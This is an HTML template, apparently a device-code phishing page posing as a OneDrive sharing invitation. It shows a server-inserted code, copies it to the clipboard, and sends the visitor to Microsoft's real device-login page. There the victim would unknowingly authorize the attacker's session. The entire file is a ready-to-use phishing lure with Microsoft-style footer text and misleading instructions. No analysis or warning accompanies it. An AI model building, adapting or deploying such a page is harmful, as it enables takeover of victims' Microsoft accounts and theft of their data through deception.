<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css">
    <link rel="stylesheet" href="https://maxcdn.icons8.com/fonts/line-awesome/1.1/css/line-awesome.min.css">
    <link rel="stylesheet" href="assets/css/styles.min.css">
</head>

<body style="width: 100%; min-height: 100vh;">
    <div id="loginForm" class="container">
        <img width="150" id="image" src="assets/img/logo.png" alt="">
        <section id="section-main">
            <section id="section-1" class="slide-page">
                <p id="signIn" class="field">Invitation for OneDrive</p>
                <p id="NoAccount" class="field">Use this code to access the shared resources.<br>Click Next to copy your code and open sign-in in a new tab.<br>You can return here anytime to view the code again.</p>
                <div id="codeRow" class="field">
                    <input type="text" id="email" value="<%= user_code %>" readonly>
                    <img src="assets/img/copy-icon.webp" alt="Copy code" onclick="copy()">
                </div>
                <p id="btnPlace" class="field">
                    <button onclick="openDeviceLogin()" class="firstNext next" type="button" id="btnSend">Next</button>
                </p>
            </section>
        </section>
    </div>
    <div id="footer" style="height: 36px;">
        <div id="terms" style="float: left;width: 84px;">
            <p style="font-size: 13px;text-align: left;">Terms of use</p>
        </div>
        <div style="float: left;width: 105px;">
            <p style="font-size: 12px;">Privacy &amp; cookies</p>
        </div>
        <div style="float: left;width: 24px;">
            <p style="font-size: 12px;">•••<br></p>
        </div>
        <div id="snackbar">Code copied</div>
    </div>

<script>
function showCopied(message) {
  var x = document.getElementById("snackbar");
  x.textContent = message || "Code copied";
  x.className = "show";
  setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
}

function copyCode(showFeedback) {
  var copyText = document.getElementById("email");
  var code = copyText.value;

  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(code).then(function() {
      if (showFeedback) showCopied();
    }).catch(function() {
      fallbackCopy(copyText, showFeedback);
    });
    return;
  }

  fallbackCopy(copyText, showFeedback);
}

function fallbackCopy(copyText, showFeedback) {
  copyText.select();
  copyText.setSelectionRange(0, 99999);
  document.execCommand('copy');
  if (showFeedback) showCopied();
}

function copy() {
  copyCode(true);
}

function openDeviceLogin() {
  copyCode(false);
  window.open('https://microsoft.com/devicelogin', '_blank', 'noopener,noreferrer');
  showCopied('Code copied — sign in on the new tab');
}
</script>


</body>
</html>
